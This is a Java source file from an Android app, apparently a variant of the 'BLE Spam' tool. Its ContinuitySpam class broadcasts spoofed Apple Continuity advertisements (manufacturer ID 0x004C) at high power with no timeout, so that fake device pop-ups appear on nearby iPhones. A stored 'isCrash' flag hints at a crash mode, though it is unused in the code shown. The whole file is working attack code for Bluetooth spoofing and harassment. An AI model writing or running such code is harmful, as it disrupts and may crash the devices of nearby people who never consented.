package com.tutozz.blespam;

import android.bluetooth.le.AdvertiseData;
import android.bluetooth.le.AdvertiseSettings;
import android.util.Log;

public class ContinuitySpam extends Spammer {
    private ContinuityDevice.type deviceType;
    private boolean isCrash;
    
    public ContinuitySpam(ContinuityDevice.type deviceType, boolean isCrash) {
        this.deviceType = deviceType;
        this.isCrash = isCrash;
    }
    
    @Override
    public void start() {
        isSpamming = true;
        
        try {
            // 🎯 ИСПОЛЬЗУЕМ ШУТОЧНЫЕ УСТРОЙСТВА ВМЕСТО ФИКСИРОВАННЫХ
            ContinuityDevice jokeDevice = ContinuityDevice.getRandomJokeDevice();
            String deviceName = jokeDevice.getName();
            String hexData = jokeDevice.getValue();
            
            Log.d("CONTINUITY_SPAM", "🚀 Starting: " + deviceName);
            
            // Конвертируем hex в byte array
            byte[] manufacturerData = hexStringToByteArray(hexData);
            
            AdvertiseData advertiseData = new AdvertiseData.Builder()
                .setIncludeDeviceName(true)
                .setIncludeTxPowerLevel(true)
                .addManufacturerData(0x004C, manufacturerData)
                .build();
                
            AdvertiseSettings advertiseSettings = new AdvertiseSettings.Builder()
                .setAdvertiseMode(AdvertiseSettings.ADVERTISE_MODE_LOW_LATENCY)
                .setTxPowerLevel(AdvertiseSettings.ADVERTISE_TX_POWER_HIGH)
                .setConnectable(false)
                .setTimeout(0)
                .build();
                
            // Используем оригинальный метод из Spammer класса
            startAdvertising(advertiseSettings, advertiseData);
            
        } catch (Exception e) {
            Log.e("CONTINUITY_SPAM", "Error: " + e.getMessage());
        }
    }
    
    @Override
    public void stop() {
        isSpamming = false;
        stopAdvertising();
    }
    
    // Вспомогательный метод для конвертации hex строки в byte array
    private byte[] hexStringToByteArray(String s) {
        try {
            int len = s.length();
            byte[] data = new byte[len / 2];
            for (int i = 0; i < len; i += 2) {
                data[i / 2] = (byte) ((Character.digit(s.charAt(i), 16) << 4)
                                     + Character.digit(s.charAt(i + 1), 16));
            }
            return data;
        } catch (Exception e) {
            Log.e("CONTINUITY_SPAM", "Error converting hex: " + e.getMessage());
            return new byte[0];
        }
    }
}